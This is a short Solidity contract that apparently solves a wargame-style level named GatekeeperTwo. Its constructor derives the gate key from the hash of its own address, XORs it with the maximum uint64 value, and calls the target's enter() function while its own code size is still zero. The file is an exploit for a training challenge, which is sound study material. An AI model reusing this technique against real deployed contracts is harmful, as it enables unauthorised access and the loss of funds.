// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    bytes8 _gateKey;

    constructor(address _target) {
        _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);

        GatekeeperTwo(_target).enter(_gateKey);
    }
}
